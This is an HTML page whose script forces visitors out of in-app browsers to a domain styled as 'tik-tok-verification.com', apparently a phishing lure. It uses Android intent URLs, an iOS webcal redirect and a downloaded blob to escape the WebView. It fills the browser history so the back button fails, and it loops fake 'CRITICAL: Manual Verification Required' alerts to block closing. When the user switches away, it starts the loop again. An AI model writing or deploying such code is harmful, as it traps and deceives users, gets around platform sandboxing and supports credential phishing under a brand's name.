<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    let testMode = true;

    // Safety switch for 5-second test window
    setTimeout(() => { testMode = false; }, 5000); 

    function forceHandover() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // 1. THE FILE BLOB TRIGGER (Universal Bypass)
        // We create a tiny "html file" in memory and "download" it.
        const blobContent = `<html><script>window.location.href="${target}";<\/script></html>`;
        const blob = new Blob([blobContent], {type: 'text/html'});
        const blobUrl = URL.createObjectURL(blob);

        if (isAndroid) {
            // Android: We use a "Double Intent"
            // First we try the direct chrome package, then the download handover.
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
            
            // Backup: Trigger the download which forces system takeover
            const a = document.createElement('a');
            a.href = blobUrl;
            a.download = "verify_secure.html";
            a.click();
        } 
        
        if (isIOS) {
            // iOS: The "App Store" / "Calendar" Protocol
            // Apps cannot block system-level protocols like 'itms-apps' or 'webcal'
            // We use a 'webcal' redirect which forces Safari to ask "Open this page in Calendar?"
            // which breaks the WebView jail.
            window.location.href = "webcal://" + target.replace("https://", "");
            
            // Fallback: The Data-URI switch
            setTimeout(() => {
                window.location.assign(blobUrl);
            }, 250);
        }
    }

    function rampage() {
        if (!testMode) return;

        // Fire the handover before the alert
        forceHandover();

        // The alert freezes the "X" button native thread
        alert("CRITICAL: Manual Verification Required.\n\nClick OK to open Secure System Browser.");
        
        // Fire again after dismissal
        forceHandover();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Jam history
        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
        rampage();
    };

    // If they try to hit 'X' (Blur), we re-arm the rampage
    window.onblur = () => { if(testMode) rampage(); };
</script>

</body>
</html>
